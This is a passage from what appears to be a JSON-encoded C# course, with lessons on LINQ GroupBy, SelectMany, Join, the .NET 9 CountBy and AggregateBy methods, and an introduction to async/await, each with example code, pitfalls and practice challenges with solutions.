              "content": "Think of organizing a music library:\n\nGROUPBY = Organizing by artist:\n• Take all songs → Group by artist → Get { Artist: [songs] }\n• Like creating folders: Beatles/, Bowie/, Queen/\n• Each group has a KEY (artist name) and VALUES (songs)\n\nSELECTMANY = Flattening nested playlists:\n• You have: [ [Song1, Song2], [Song3], [Song4, Song5] ]\n• SelectMany → [Song1, Song2, Song3, Song4, Song5]\n• Turns nested collections into ONE flat list!\n\nJOIN = Matching data from two sources:\n• Like a VLOOKUP in Excel\n• 'Match Orders with Customers on CustomerId'\n• Combines data where keys match\n\nThese are ESSENTIAL for real-world data manipulation!\n\nThink: 'GroupBy organizes, SelectMany flattens, Join connects!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\n// Sample data\nvar products = new[]\n{\n    new { Id = 1, Name = \"Laptop\", Category = \"Electronics\", Price = 999m },\n    new { Id = 2, Name = \"Mouse\", Category = \"Electronics\", Price = 29m },\n    new { Id = 3, Name = \"Desk\", Category = \"Furniture\", Price = 299m },\n    new { Id = 4, Name = \"Chair\", Category = \"Furniture\", Price = 199m },\n    new { Id = 5, Name = \"Monitor\", Category = \"Electronics\", Price = 399m }\n};\n\n// ===== GROUPBY: Group products by category =====\nvar productsByCategory = products.GroupBy(p => p.Category);\n\nConsole.WriteLine(\"=== GroupBy: Products by Category ===\");\nforeach (var group in productsByCategory)\n{\n    Console.WriteLine($\"\\n{group.Key} ({group.Count()} items):\");\n    foreach (var product in group)\n    {\n        Console.WriteLine($\"  - {product.Name}: ${product.Price}\");\n    }\n}\n\n// GroupBy with aggregation\nvar categorySummary = products\n    .GroupBy(p => p.Category)\n    .Select(g => new\n    {\n        Category = g.Key,\n        Count = g.Count(),\n        TotalValue = g.Sum(p => p.Price),\n        AveragePrice = g.Average(p => p.Price)\n    });\n\nConsole.WriteLine(\"\\n=== GroupBy with Aggregation ===\");\nforeach (var summary in categorySummary)\n{\n    Console.WriteLine($\"{summary.Category}: {summary.Count} items, \" +\n        $\"Total: ${summary.TotalValue}, Avg: ${summary.AveragePrice:F2}\");\n}\n\n// ===== SELECTMANY: Flatten nested collections =====\nvar departments = new[]\n{\n    new { Name = \"IT\", Employees = new[] { \"Alice\", \"Bob\" } },\n    new { Name = \"HR\", Employees = new[] { \"Carol\" } },\n    new { Name = \"Sales\", Employees = new[] { \"Dave\", \"Eve\", \"Frank\" } }\n};\n\n// Without SelectMany: nested IEnumerable<string[]>\nvar nested = departments.Select(d => d.Employees);\n\n// With SelectMany: flat IEnumerable<string>\nvar allEmployees = departments.SelectMany(d => d.Employees);\nConsole.WriteLine(\"\\n=== SelectMany: All Employees ===\");\nConsole.WriteLine(string.Join(\", \", allEmployees));\n\n// SelectMany with projection\nvar employeeDetails = departments\n    .SelectMany(\n        d => d.Employees,\n        (dept, emp) => new { Department = dept.Name, Employee = emp }\n    );\n\nConsole.WriteLine(\"\\n=== SelectMany with Projection ===\");\nforeach (var e in employeeDetails)\n{\n    Console.WriteLine($\"{e.Employee} works in {e.Department}\");\n}\n\n// ===== JOIN: Combine two data sources =====\nvar orders = new[]\n{\n    new { OrderId = 1, ProductId = 1, Quantity = 2 },\n    new { OrderId = 2, ProductId = 3, Quantity = 1 },\n    new { OrderId = 3, ProductId = 2, Quantity = 5 }\n};\n\nvar orderDetails = orders.Join(\n    products,                      // Inner collection\n    order => order.ProductId,      // Outer key selector\n    product => product.Id,         // Inner key selector\n    (order, product) => new        // Result selector\n    {\n        order.OrderId,\n        product.Name,\n        order.Quantity,\n        Total = product.Price * order.Quantity\n    }\n);\n\nConsole.WriteLine(\"\\n=== Join: Order Details ===\");\nforeach (var detail in orderDetails)\n{\n    Console.WriteLine($\"Order {detail.OrderId}: {detail.Quantity}x {detail.Name} = ${detail.Total}\");\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`collection.GroupBy(x => x.Key)`**: Groups items by a key. Returns IEnumerable<IGrouping<TKey, TElement>>. Each group has .Key (the grouping value) and acts as IEnumerable of items.\n\n**`GroupBy + Select for aggregation`**: Common pattern: `.GroupBy(x => x.Category).Select(g => new { g.Key, Count = g.Count(), Sum = g.Sum(...) })`. Transforms groups into summary objects.\n\n**`collection.SelectMany(x => x.Items)`**: Flattens nested collections. If each element contains a collection, SelectMany extracts and concatenates them all.\n\n**`SelectMany with result selector`**: `.SelectMany(d => d.Items, (parent, item) => new { parent.Name, item })`. Second lambda combines parent object with each flattened item.\n\n**`outer.Join(inner, outerKey, innerKey, result)`**: Matches items where keys are equal. Like SQL INNER JOIN. Only items with matching keys appear in result.\n\n**`GroupJoin for LEFT JOIN behavior`**: Use `.GroupJoin()` when you need all outer items even without matches (like SQL LEFT JOIN)."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Select vs SelectMany confusion**: `Select` returns nested collections (`IEnumerable<string[]>`), `SelectMany` flattens them (`IEnumerable<string>`). If you're getting a collection of collections when you want a flat list, switch to SelectMany!\n\n**IGrouping is enumerable**: Each group from `GroupBy` IS an `IEnumerable`! To access items: `foreach (var item in group) { ... }`. To aggregate: `group.Sum(x => x.Value)`. Don't try to access items directly without iterating.\n\n**Join key type mismatch**: Join keys must be the SAME type! Joining `order.ProductId` (int) with `product.Id` (string) returns ZERO results silently. Convert types if needed: `order => order.ProductId.ToString()`.\n\n**Join is INNER JOIN**: LINQ `.Join()` only returns items with matching keys (like SQL INNER JOIN). Items without matches are silently excluded! For LEFT JOIN behavior (keep all left items), use `.GroupJoin()` with `.DefaultIfEmpty()`."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-09-06-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Practice advanced LINQ operations!\n\n1. Create a list of students with properties: Name, Grade (A/B/C), Score\n   - At least 6 students across different grades\n\n2. Use GroupBy to:\n   - Group students by Grade\n   - For each group, print the grade and all student names\n\n3. Use GroupBy with aggregation to find:\n   - Average score per grade\n   - Print: 'Grade A: Average = 92.5' etc.\n\n4. Create a list of Courses with: CourseId, Name, StudentNames (string[])\n   Use SelectMany to get all unique student names across all courses.\n\nDemonstrate GroupBy, aggregation, and SelectMany!",
              "starterCode": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\n// Student class\nclass Student\n{\n    public string Name { get; set; }\n    public string Grade { get; set; }\n    public int Score { get; set; }\n}\n\n// Create students\nvar students = new List<Student>\n{\n    new Student { Name = \"Alice\", Grade = \"A\", Score = 95 },\n    // Add more students...\n};\n\n// Group by grade and print\nvar byGrade = students.GroupBy(s => s.Grade);\nforeach (var group in byGrade)\n{\n    Console.WriteLine($\"Grade {group.Key}:\");\n    // Print each student in group\n}\n\n// Average score per grade\nvar gradeAverages = students\n    .GroupBy(s => s.Grade)\n    .Select(g => new { /* create summary */ });\n\n// Print averages\n\n// SelectMany example\nvar courses = new[]\n{\n    new { Name = \"Math\", StudentNames = new[] { \"Alice\", \"Bob\" } },\n    // Add more courses...\n};\n\nvar allStudentNames = courses.SelectMany(c => c.StudentNames);\nConsole.WriteLine(\"\\nAll students: \" + string.Join(\", \", allStudentNames.Distinct()));",
              "solution": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass Student\n{\n    public string Name { get; set; }\n    public string Grade { get; set; }\n    public int Score { get; set; }\n}\n\nvar students = new List<Student>\n{\n    new Student { Name = \"Alice\", Grade = \"A\", Score = 95 },\n    new Student { Name = \"Bob\", Grade = \"B\", Score = 82 },\n    new Student { Name = \"Carol\", Grade = \"A\", Score = 91 },\n    new Student { Name = \"Dave\", Grade = \"C\", Score = 74 },\n    new Student { Name = \"Eve\", Grade = \"B\", Score = 88 },\n    new Student { Name = \"Frank\", Grade = \"A\", Score = 97 }\n};\n\nConsole.WriteLine(\"=== Students by Grade ===\");\nvar byGrade = students.GroupBy(s => s.Grade).OrderBy(g => g.Key);\nforeach (var group in byGrade)\n{\n    Console.WriteLine($\"\\nGrade {group.Key}:\");\n    foreach (var student in group)\n    {\n        Console.WriteLine($\"  {student.Name} ({student.Score})\");\n    }\n}\n\nConsole.WriteLine(\"\\n=== Average Score per Grade ===\");\nvar gradeAverages = students\n    .GroupBy(s => s.Grade)\n    .Select(g => new { Grade = g.Key, Average = g.Average(s => s.Score) })\n    .OrderBy(x => x.Grade);\n\nforeach (var avg in gradeAverages)\n{\n    Console.WriteLine($\"Grade {avg.Grade}: Average = {avg.Average:F1}\");\n}\n\nvar courses = new[]\n{\n    new { Name = \"Math\", StudentNames = new[] { \"Alice\", \"Bob\", \"Carol\" } },\n    new { Name = \"Science\", StudentNames = new[] { \"Bob\", \"Dave\", \"Eve\" } },\n    new { Name = \"English\", StudentNames = new[] { \"Alice\", \"Eve\", \"Frank\" } }\n};\n\nvar allStudentNames = courses.SelectMany(c => c.StudentNames).Distinct();\nConsole.WriteLine(\"\\n=== All Students (SelectMany) ===\");\nConsole.WriteLine(string.Join(\", \", allStudentNames));",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Grade\"",
                  "expectedOutput": "Grade",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Average\"",
                  "expectedOutput": "Average",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"SelectMany\" or list all students",
                  "expectedOutput": "Alice",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "GroupBy syntax: 'collection.GroupBy(x => x.Property)'. Each group has .Key (the property value) and contains all matching items."
                },
                {
                  "level": 2,
                  "text": "GroupBy with aggregation: '.GroupBy(x => x.Prop).Select(g => new { g.Key, Avg = g.Average(x => x.Value) })'. Use .Average(), .Sum(), .Count() on each group."
                },
                {
                  "level": 3,
                  "text": "SelectMany flattens: If you have List<Course> where each Course has string[] Students, 'courses.SelectMany(c => c.Students)' gives you one flat list of all student names."
                },
                {
                  "level": 4,
                  "text": "Distinct removes duplicates: 'collection.SelectMany(...).Distinct()' returns only unique values."
                },
                {
                  "level": 5,
                  "text": "Join requires 4 arguments: outer.Join(inner, outerKey, innerKey, resultSelector). Keys must match types exactly!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting IGrouping is enumerable",
                  "consequence": "GroupBy returns groups, not items! Each group IS an IEnumerable. Iterate with 'foreach (var item in group)' or use LINQ methods on the group itself.",
                  "correction": "Access items: 'foreach (var group in grouped) { foreach (var item in group) { ... } }'. Or aggregate: 'group.Sum(x => x.Value)'."
                },
                {
                  "mistake": "SelectMany vs Select confusion",
                  "consequence": "Select returns nested collections: IEnumerable<string[]>. SelectMany flattens: IEnumerable<string>. Use SelectMany when you want one flat list from nested data!",
                  "correction": "If you're getting IEnumerable<IEnumerable<T>> and want IEnumerable<T>, switch from Select to SelectMany."
                },
                {
                  "mistake": "Join key type mismatch",
                  "consequence": "Join keys must be the same type! Joining on 'order.ProductId (int)' and 'product.Id (string)' will return ZERO results with no error!",
                  "correction": "Ensure key types match exactly. Convert if needed: 'order => order.ProductId.ToString()' to match string keys."
                },
                {
                  "mistake": "Expecting LEFT JOIN behavior from Join",
                  "consequence": "LINQ .Join() is an INNER JOIN - only items with matching keys appear! Items without matches are silently excluded.",
                  "correction": "For LEFT JOIN behavior (keep all left items even without matches), use .GroupJoin() with .DefaultIfEmpty()."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-09-07",
          "title": "New in .NET 9: CountBy and AggregateBy",
          "moduleId": "module-09",
          "order": 7,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine sorting your groceries: 'How many items per category?' (CountBy) or 'What's the total cost per category?' (AggregateBy). Before .NET 9, you'd need GroupBy + Select + Count/Sum. Now it's one simple method call!\n\nCountBy = Quick counting by key:\n- 'How many products in each category?'\n- Returns KeyValuePair<TKey, int> for each group\n- Single method instead of GroupBy().Select(g => new { g.Key, g.Count() })\n\nAggregateBy = Accumulate values by key:\n- 'What's the total price per category?'\n- You provide: key selector, seed value, accumulator function\n- Returns KeyValuePair<TKey, TAccumulate> for each group\n\nBoth methods:\n- More efficient (single pass through data)\n- Cleaner code (one method vs. chain)\n- Type-safe (strong typing on key and result)\n\nThink: 'GroupBy patterns simplified into direct, purpose-built methods!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": ".NET 9 introduces CountBy and AggregateBy - two LINQ methods that replace common GroupBy patterns with cleaner, more efficient code.",
              "code": "using System;\nusing System.Linq;\n\nvar products = new[]\n{\n    new { Name = \"Apple\", Category = \"Fruit\", Price = 1.50m },\n    new { Name = \"Banana\", Category = \"Fruit\", Price = 0.75m },\n    new { Name = \"Carrot\", Category = \"Vegetable\", Price = 0.50m },\n    new { Name = \"Broccoli\", Category = \"Vegetable\", Price = 1.25m },\n    new { Name = \"Orange\", Category = \"Fruit\", Price = 1.00m }\n};\n\n// ===== COUNTBY: Count items by key =====\nConsole.WriteLine(\"=== CountBy ===\");\nvar countByCategory = products.CountBy(p => p.Category);\nforeach (var (category, count) in countByCategory)\n    Console.WriteLine($\"{category}: {count} items\");\n// Output: Fruit: 3 items, Vegetable: 2 items\n\n// ===== AGGREGATEBY: Sum/aggregate values by key =====\nConsole.WriteLine(\"\\n=== AggregateBy ===\");\nvar totalByCategory = products.AggregateBy(\n    keySelector: p => p.Category,\n    seed: 0m,\n    func: (total, product) => total + product.Price);\n\nforeach (var (category, total) in totalByCategory)\n    Console.WriteLine($\"{category}: ${total}\");\n// Output: Fruit: $3.25, Vegetable: $1.75\n\n// ===== COMPARE TO OLD WAY (verbose) =====\nConsole.WriteLine(\"\\n=== Old GroupBy Way (for comparison) ===\");\nvar oldWayCount = products\n    .GroupBy(p => p.Category)\n    .Select(g => new { Category = g.Key, Count = g.Count() });\n\nvar oldWaySum = products\n    .GroupBy(p => p.Category)\n    .Select(g => new { Category = g.Key, Total = g.Sum(p => p.Price) });\n\nforeach (var item in oldWaySum)\n    Console.WriteLine($\"{item.Category}: ${item.Total}\");\n\n// ===== MORE EXAMPLES =====\n// Count orders by status\nvar orders = new[] { \"Pending\", \"Shipped\", \"Pending\", \"Delivered\", \"Shipped\", \"Shipped\" };\nvar orderCounts = orders.CountBy(status => status);\nConsole.WriteLine(\"\\n=== Order Status Counts ===\");\nforeach (var (status, count) in orderCounts)\n    Console.WriteLine($\"{status}: {count}\");\n\n// AggregateBy with string concatenation\nvar employees = new[]\n{\n    new { Name = \"Alice\", Department = \"IT\" },\n    new { Name = \"Bob\", Department = \"HR\" },\n    new { Name = \"Carol\", Department = \"IT\" },\n    new { Name = \"Dave\", Department = \"IT\" }\n};\n\nvar namesByDept = employees.AggregateBy(\n    e => e.Department,\n    seed: \"\",\n    func: (names, emp) => names == \"\" ? emp.Name : names + \", \" + emp.Name);\n\nConsole.WriteLine(\"\\n=== Employees by Department ===\");\nforeach (var (dept, names) in namesByDept)\n    Console.WriteLine($\"{dept}: {names}\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**CountBy<TSource, TKey>**\n```csharp\nsource.CountBy(keySelector)\n```\n- Returns `IEnumerable<KeyValuePair<TKey, int>>`\n- Counts occurrences of each key\n- Equivalent to: `.GroupBy(key).Select(g => new { g.Key, Count = g.Count() })`\n\n**AggregateBy<TSource, TKey, TAccumulate>**\n```csharp\nsource.AggregateBy(keySelector, seed, func)\n```\n- `keySelector`: Groups items by this key\n- `seed`: Starting value for aggregation (e.g., 0 for sum, \"\" for strings)\n- `func`: Combines accumulator with each item `(acc, item) => newAcc`\n- Returns `IEnumerable<KeyValuePair<TKey, TAccumulate>>`\n\n**Why Use These?**\n1. **Cleaner code**: One method vs GroupBy+Select+Aggregate chain\n2. **More efficient**: Single pass through data\n3. **Type-safe**: Strong typing on key and accumulator\n4. **Intent clarity**: Method name describes exactly what you're doing\n\n**When to Use Which?**\n- Use `CountBy` when you just need counts per group\n- Use `AggregateBy` when you need to combine/accumulate values\n- Use `GroupBy` when you need the actual grouped items (not just aggregations)"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**.NET 9 required!**: CountBy and AggregateBy are NEW in .NET 9! They won't compile on .NET 8 or earlier. Ensure your project targets `net9.0` in your .csproj file: `<TargetFramework>net9.0</TargetFramework>`.\n\n**Wrong seed type in AggregateBy**: The seed value's type determines the accumulator type! Using `0` (int) when summing decimals causes type mismatch. Match your seed to your values: `0m` for decimal, `0.0` for double, `\"\"` for string concatenation.\n\n**Forgetting the seed in AggregateBy**: AggregateBy requires THREE arguments: key selector, seed, and accumulator function. Missing the seed causes a compiler error.\n\n**Still using GroupBy+Select for simple counts**: If you're writing `.GroupBy(x => x.Key).Select(g => new { g.Key, Count = g.Count() })`, switch to `.CountBy(x => x.Key)` for cleaner, more efficient code. Same applies to simple aggregations with AggregateBy."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-09-07-challenge-01",
              "title": "Sales Analytics Dashboard",
              "description": "Use CountBy and AggregateBy to analyze sales data.",
              "instructions": "Given a list of sales records with Region and Amount:\n1. Use CountBy to find number of sales per region\n2. Use AggregateBy to find total sales amount per region\n3. Print both results with descriptive labels\n\nExpected output format:\n- Sales count per region: Region: X sales\n- Total sales per region: Region: $XXX",
              "starterCode": "using System;\nusing System.Linq;\n\nvar sales = new[]\n{\n    new { Region = \"North\", Amount = 500m },\n    new { Region = \"South\", Amount = 300m },\n    new { Region = \"North\", Amount = 200m },\n    new { Region = \"East\", Amount = 400m },\n    new { Region = \"South\", Amount = 600m }\n};\n\n// TODO: Count sales per region using CountBy\nConsole.WriteLine(\"Sales count per region:\");\n\n// TODO: Sum sales amount per region using AggregateBy\nConsole.WriteLine(\"\\nTotal sales per region:\");",
              "solution": "using System;\nusing System.Linq;\n\nvar sales = new[]\n{\n    new { Region = \"North\", Amount = 500m },\n    new { Region = \"South\", Amount = 300m },\n    new { Region = \"North\", Amount = 200m },\n    new { Region = \"East\", Amount = 400m },\n    new { Region = \"South\", Amount = 600m }\n};\n\n// Count sales per region\nvar countPerRegion = sales.CountBy(s => s.Region);\nConsole.WriteLine(\"Sales count per region:\");\nforeach (var (region, count) in countPerRegion)\n    Console.WriteLine($\"  {region}: {count} sales\");\n\n// Sum amount per region\nvar totalPerRegion = sales.AggregateBy(\n    s => s.Region,\n    0m,\n    (sum, sale) => sum + sale.Amount);\n\nConsole.WriteLine(\"\\nTotal sales per region:\");\nforeach (var (region, total) in totalPerRegion)\n    Console.WriteLine($\"  {region}: ${total}\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-countby",
                  "description": "CountBy returns correct counts per region",
                  "expectedOutput": "North: 2",
                  "isVisible": true
                },
                {
                  "id": "test-aggregateby",
                  "description": "AggregateBy returns correct totals per region",
                  "expectedOutput": "North: $700",
                  "isVisible": true
                },
                {
                  "id": "test-south-count",
                  "description": "South region has correct count",
                  "expectedOutput": "South: 2",
                  "isVisible": true
                },
                {
                  "id": "test-south-total",
                  "description": "South region has correct total",
                  "expectedOutput": "South: $900",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "CountBy syntax: 'collection.CountBy(item => item.KeyProperty)'. Returns KeyValuePair<TKey, int> that you can destructure: 'foreach (var (key, count) in results)'."
                },
                {
                  "level": 2,
                  "text": "AggregateBy needs three arguments: key selector (s => s.Region), seed value (0m for decimal sum), and accumulator function ((sum, item) => sum + item.Amount)."
                },
                {
                  "level": 3,
                  "text": "The seed value type determines the result type. Use 0m for decimal sums, 0 for int sums, \"\" for string concatenation."
                },
                {
                  "level": 4,
                  "text": "Both methods return IEnumerable<KeyValuePair<TKey, TValue>>. Use tuple deconstruction: 'foreach (var (region, value) in results)' for clean iteration."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using GroupBy + Count instead of CountBy",
                  "consequence": "CountBy is a single-method replacement that's more efficient and readable. Instead of .GroupBy(x => x.Key).Select(g => new { g.Key, g.Count() }), just use .CountBy(x => x.Key).",
                  "correction": "Replace the GroupBy chain with: sales.CountBy(s => s.Region)"
                },
                {
                  "mistake": "Forgetting the seed value in AggregateBy",
                  "consequence": "AggregateBy requires a seed value as the second argument. Without it, you'll get a compiler error.",
                  "correction": "Always provide a seed: sales.AggregateBy(key, 0m, (sum, item) => sum + item.Amount) where 0m is the seed for decimal sum."
                },
                {
                  "mistake": "Wrong seed type for aggregation",
                  "consequence": "The seed type determines the accumulator type. Using 0 (int) when summing decimals will cause type mismatch errors.",
                  "correction": "Match seed type to your values: 0m for decimal, 0 for int, 0.0 for double, \"\" for strings."
                },
                {
                  "mistake": "Trying to use CountBy/AggregateBy on .NET 8 or earlier",
                  "consequence": "These methods are new in .NET 9. Using them on earlier versions will result in 'method not found' errors.",
                  "correction": "Ensure your project targets .NET 9 or later in your .csproj file: <TargetFramework>net9.0</TargetFramework>"
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ]
    },
    {
      "id": "module-10",
      "title": "Asynchronous Programming",
      "description": "Master async/await, Tasks, asynchronous operations, and building responsive applications.",
      "difficulty": "beginner",
      "estimatedHours": 1,
      "lessons": [
        {
          "id": "lesson-10-01",
          "title": "Synchronous vs. Asynchronous (Restaurant Buzzer Analogy)",
          "moduleId": "module-10",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine two ways to get food:\n\nSYNCHRONOUS (blocking):\n• You order at counter\n• You WAIT in line, doing NOTHING\n• Only after you get food can you sit down\n• Everyone behind you is BLOCKED!\n\nASYNCHRONOUS (non-blocking):\n• You order at counter\n• They give you a BUZZER\n• You sit down, chat, check your phone (do other things!)\n• Buzzer goes off when food is ready\n• You pick up food\n• Others can order while you wait!\n\nThat's the difference!\n\nSYNCHRONOUS code: Each line waits for the previous one to FINISH. Program is frozen during slow operations (file I/O, web requests, database queries).\n\nASYNCHRONOUS code: Start slow operation, do OTHER WORK while waiting, come back when it's done. App stays responsive!\n\nThink: Async = 'Don't wait around doing nothing. Start the task and come back when it's ready!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using System;\nusing System.Threading;\nusing System.Threading.Tasks;\n\n// SYNCHRONOUS VERSION - blocks the thread\nvoid DownloadFileSync()\n{\n    Console.WriteLine(\"  Starting sync download...\");\n    Thread.Sleep(3000);  // Blocks for 3 seconds!\n    Console.WriteLine(\"  Sync download complete!\");\n}\n\n// ASYNCHRONOUS VERSION - doesn't block\nasync Task DownloadFileAsync()\n{\n    Console.WriteLine(\"  Starting async download...\");\n    await Task.Delay(3000);  // Doesn't block!\n    Console.WriteLine(\"  Async download complete!\");\n}\n\n// DEMONSTRATION 1: Synchronous (blocking)\nConsole.WriteLine(\"=== SYNCHRONOUS (Blocking) ===\");\nConsole.WriteLine(\"Before download\");\nDownloadFileSync();  // Program FREEZES here for 3 seconds!\nConsole.WriteLine(\"After download (had to wait)\\n\");\n\n// Output:\n// Before download\n// Starting sync download...\n// (3 second freeze - can't do anything!)\n// Sync download complete!\n// After download (had to wait)\n\n// DEMONSTRATION 2: Asynchronous (non-blocking)\nConsole.WriteLine(\"=== ASYNCHRONOUS (Non-blocking) ===\");\nConsole.WriteLine(\"Before download\");\nTask downloadTask = DownloadFileAsync();  // Starts but doesn't wait!\nConsole.WriteLine(\"Doing other work immediately!\");\nConsole.WriteLine(\"Still working...\");\nawait downloadTask;  // Now wait for it to finish\nConsole.WriteLine(\"After download\\n\");\n\n// Output:\n// Before download\n// Starting async download...\n// Doing other work immediately!  ← Runs DURING download!\n// Still working...                ← Also DURING download!\n// (after 3 seconds)\n// Async download complete!\n// After download\n\n// REAL BENEFIT: Multiple async operations simultaneously\nConsole.WriteLine(\"=== MULTIPLE ASYNC OPERATIONS ===\");\nTask d1 = DownloadFileAsync();  // Start first\nTask d2 = DownloadFileAsync();  // Start second\nTask d3 = DownloadFileAsync();  // Start third\n\nConsole.WriteLine(\"All 3 downloads started!\");\nConsole.WriteLine(\"Doing other work while all 3 run...\");\n\nawait Task.WhenAll(d1, d2, d3);  // Wait for ALL to finish\nConsole.WriteLine(\"All downloads complete!\");\n// Total time: ~3 seconds (not 9!), because they ran SIMULTANEOUSLY!",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`Thread.Sleep() vs Task.Delay()`**: Thread.Sleep() BLOCKS the thread (synchronous). Task.Delay() is ASYNC - releases thread while waiting. Always prefer Task.Delay() in async code!\n\n**`async Task MethodName()`**: 'async' keyword marks method as asynchronous. Return type is usually 'Task' (void equivalent) or 'Task<T>' (returns T). Enables 'await' inside.\n\n**`await expression`**: 'await' says 'pause here until this Task completes, but release the thread for other work.' Can only use inside 'async' method.\n\n**`Task.WhenAll()`**: Runs multiple async operations simultaneously! Waits for ALL to complete. Much faster than running one-by-one."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Async Gotchas to Avoid!\n\n**1. Never use Thread.Sleep() in async code!**\nThread.Sleep() blocks the entire thread, defeating the purpose of async. Always use `await Task.Delay()` instead.\n\n**2. Don't mix sync and async carelessly!**\nCalling `.Result` or `.Wait()` on a Task in UI/ASP.NET apps can cause DEADLOCKS. The sync call blocks waiting for the async operation, but the async operation needs that same thread to continue!\n\n**3. Async doesn't mean parallel!**\nAsync is about not BLOCKING, not about running things simultaneously. In a single-threaded context (like UI), tasks are interleaved, not truly parallel. Use Task.Run() for CPU-bound parallelism.\n\n**4. Fire-and-forget is dangerous!**\nCalling `DoWorkAsync()` without await starts the task but you lose track of it. Exceptions are silently swallowed! Always await or store the Task for later handling."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-10-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Simulate a coffee shop with async operations!\n\n1. Create async method 'BrewCoffeeAsync(string type)':\n   - Print 'Brewing [type] coffee...'\n   - await Task.Delay(2000) to simulate brewing\n   - Print '[type] coffee ready!'\n   - Return Task\n\n2. Create async method 'ToastBreadAsync()':\n   - Print 'Toasting bread...'\n   - await Task.Delay(1000)\n   - Print 'Toast ready!'\n   - Return Task\n\n3. In Main (or top-level):\n   - Start brewing coffee (don't await yet!)\n   - Start toasting bread (don't await yet!)\n   - Print 'Doing other tasks...'\n   - await BOTH tasks\n   - Print 'Breakfast ready!'\n\nBoth should run SIMULTANEOUSLY!",
              "starterCode": "using System;\nusing System.Threading.Tasks;\n\nasync Task BrewCoffeeAsync(string type)\n{\n    // Print starting message\n    // await Task.Delay(2000)\n    // Print ready message\n}\n\nasync Task ToastBreadAsync()\n{\n    // Print starting message\n    // await Task.Delay(1000)\n    // Print ready message\n}\n\n// Main async code\nConsole.WriteLine(\"Starting breakfast...\");\n\n// Start both tasks\nTask coffeeTask = BrewCoffeeAsync(\"Espresso\");\nTask toastTask = ToastBreadAsync();\n\nConsole.WriteLine(\"Doing other tasks...\");\n\n// Wait for both\nawait Task.WhenAll(coffeeTask, toastTask);\n\nConsole.WriteLine(\"Breakfast ready!\");",
              "solution": "using System;\nusing System.Threading.Tasks;\n\nasync Task BrewCoffeeAsync(string type)\n{\n    Console.WriteLine(\"Brewing \" + type + \" coffee...\");\n    await Task.Delay(2000);\n    Console.WriteLine(type + \" coffee ready!\");\n}\n\nasync Task ToastBreadAsync()\n{\n    Console.WriteLine(\"Toasting bread...\");\n    await Task.Delay(1000);\n    Console.WriteLine(\"Toast ready!\");\n}\n\nConsole.WriteLine(\"Starting breakfast...\");\n\nTask coffeeTask = BrewCoffeeAsync(\"Espresso\");\nTask toastTask = ToastBreadAsync();\n\nConsole.WriteLine(\"Doing other tasks...\");\n\nawait Task.WhenAll(coffeeTask, toastTask);\n\nConsole.WriteLine(\"Breakfast ready!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Brewing\"",
                  "expectedOutput": "Brewing",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Toasting\"",
                  "expectedOutput": "Toasting",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Doing other tasks\"",
                  "expectedOutput": "Doing other tasks",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"ready\"",
                  "expectedOutput": "ready",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Async method: 'async Task MethodName()'. Inside: 'await Task.Delay(milliseconds)'. Start without await: 'Task t = MethodAsync()'. Wait for multiple: 'await Task.WhenAll(t1, t2)'."
                },
                {
                  "level": 2,
                  "text": "Forgetting 'await': If you call 'MethodAsync()' without 'await', it starts but you don't wait for it! The method continues immediately. Use 'await' when you need the result."
                },
                {
                  "level": 3,
                  "text": "Using Thread.Sleep() in async: NEVER use Thread.Sleep() in async methods! It blocks the thread. Always use 'await Task.Delay()' instead."
                },
                {
                  "level": 4,
                  "text": "Async void: Only use 'async void' for event handlers! For regular methods, use 'async Task'. 'async void' can't be awaited and swallows exceptions."
                },
                {
                  "level": 5,
